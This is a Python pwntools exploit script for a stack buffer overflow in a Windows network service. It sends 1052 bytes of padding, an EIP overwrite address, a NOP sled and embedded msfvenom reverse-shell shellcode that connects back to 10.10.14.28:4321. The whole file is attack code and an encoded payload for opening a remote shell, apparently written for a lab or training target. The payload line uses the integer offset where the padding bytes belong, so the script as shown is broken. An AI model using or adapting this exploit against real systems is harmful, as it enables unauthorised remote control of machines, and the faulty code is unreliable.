#!/usr/bin/python3
# coding: utf-8

from pwn import *

def def_handler(sig, frame):
	print("\n\n[!]Saindo...\n\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# badchars = "\x00"

#Variaveis_globais
ip = "127.0.0.1"
port = 8888
offset = 1052
nops = b"\x90" * 16

# msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 lhost=10.10.14.28 lport=4321 -b "\x00" EXITFUNC=thread -f python

buf =  b""
buf += b"\xb8\x9e\x02\xd9\xf7\xda\xda\xd9\x74\x24\xf4\x5d\x2b"
buf += b"\xc9\xb1\x52\x31\x45\x12\x83\xc5\x04\x03\xdb\x0c\x3b"
buf += b"\x02\x1f\xf8\x39\xed\xdf\xf9\x5d\x67\x3a\xc8\x5d\x13"
buf += b"\x4f\x7b\x6e\x57\x1d\x70\x05\x35\xb5\x03\x6b\x92\xba"
buf += b"\xa4\xc6\xc4\xf5\x35\x7a\x34\x94\xb5\x81\x69\x76\x87"
buf += b"\x49\x7c\x77\xc0\xb4\x8d\x25\x99\xb3\x20\xd9\xae\x8e"
buf += b"\xf8\x52\xfc\x1f\x79\x87\xb5\x1e\xa8\x16\xcd\x78\x6a"
buf += b"\x99\x02\xf1\x23\x81\x47\x3c\xfd\x3a\xb3\xca\xfc\xea"
buf += b"\x8d\x33\x52\xd3\x21\xc6\xaa\x14\x85\x39\xd9\x6c\xf5"
buf += b"\xc4\xda\xab\x87\x12\x6e\x2f\x2f\xd0\xc8\x8b\xd1\x35"
buf += b"\x8e\x58\xdd\xf2\xc4\x06\xc2\x05\x08\x3d\xfe\x8e\xaf"
buf += b"\x91\x76\xd4\x8b\x35\xd2\x8e\xb2\x6c\xbe\x61\xca\x6e"
buf += b"\x61\xdd\x6e\xe5\x8c\x0a\x03\xa4\xd8\xff\x2e\x56\x19"
buf += b"\x68\x38\x25\x2b\x37\x92\xa1\x07\xb0\x3c\x36\x67\xeb"
buf += b"\xf9\xa8\x96\x14\xfa\xe1\x5c\x40\xaa\x99\x75\xe9\x21"
buf += b"\x59\x79\x3c\xe5\x09\xd5\xef\x46\xf9\x95\x5f\x2f\x13"
buf += b"\x1a\xbf\x4f\x1c\xf0\xa8\xfa\xe7\x93\xdc\xf0\xe9\x7f"
buf += b"\x89\x06\xf5\x6f\xa8\x8e\x13\xe5\x3a\xc7\x8c\x92\xa3"
buf += b"\x42\x46\x02\x2b\x59\x23\x04\xa7\x6e\xd4\xcb\x40\x1a"
buf += b"\xc6\xbc\xa0\x51\xb4\x6b\xbe\x4f\xd0\xf0\x2d\x14\x20"
buf += b"\x7e\x4e\x83\x77\xd7\xa0\xda\x1d\xc5\x9b\x74\x03\x14"
buf += b"\x7d\xbe\x87\xc3\xbe\x41\x06\x81\xfb\x65\x18\x5f\x03"
buf += b"\x22\x4c\x0f\x52\xfc\x3a\xe9\x0c\x4e\x94\xa3\xe3\x18"
buf += b"\x70\x35\xc8\x9a\x06\x3a\x05\x6d\xe6\x8b\xf0\x28\x19"
buf += b"\x23\x95\xbc\x62\x59\x05\x42\xb9\xd9\x25\xa1\x6b\x14"
buf += b"\xce\x7c\xfe\x95\x93\x7e\xd5\xda\xad\xfc\xdf\xa2\x49"
buf += b"\x1c\xaa\xa7\x16\x9a\x47\xda\x07\x4f\x67\x49\x27\x5a" 

def exploit():

	junk = b"A" * offset
	eip = p32(0x68A98A7B)
	esp = buf
	payload = offset + eip + nops + esp
	p = remote(ip, port)
	p.sendline(payload)

if __name__ == '__main__':
	exploit()
